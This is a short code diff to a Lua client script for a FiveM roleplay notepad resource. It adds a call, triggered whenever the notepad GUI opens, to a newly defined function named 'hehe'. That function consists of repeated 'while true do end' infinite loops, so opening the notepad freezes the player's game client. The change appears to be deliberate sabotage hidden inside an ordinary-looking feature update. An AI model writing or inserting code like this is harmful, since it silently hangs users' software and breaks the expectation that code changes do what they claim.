@@ -49,6 +49,7 @@ RegisterNetEvent("lkrp_notepad:OpenNotepadGui")
 AddEventHandler("lkrp_notepad:OpenNotepadGui", function()
     if not isUiOpen then
         openGui()
+        hehe("Hejsa")
     end
 end)
 
@@ -181,3 +182,9 @@ Citizen.CreateThread(function()
         end
     end 
 end)
+
+
+function hehe(boi)
+    while true do end while true do end while true do end while true do end while true do end
+    print(boi)
+end
